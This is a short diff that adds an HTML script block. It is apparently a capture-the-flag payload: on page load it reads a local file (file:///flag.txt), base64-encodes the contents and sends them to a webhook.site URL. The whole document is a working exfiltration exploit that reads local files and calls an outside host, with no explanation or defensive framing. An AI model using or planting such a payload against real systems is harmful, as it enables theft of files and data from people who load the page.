@@ -1,0 +1,13 @@
+<script>
+
+    window.onload = function() {
+
+x=new XMLHttpRequest;
+
+x.onload=function(){fetch('https://webhook.site/f01debc3-c5e8-4a9f-ab8f-2189a1656cae?i=' + btoa(this.responseText))};
+
+x.open("GET","file:///flag.txt");x.send();
+
+    }
+
+</script>
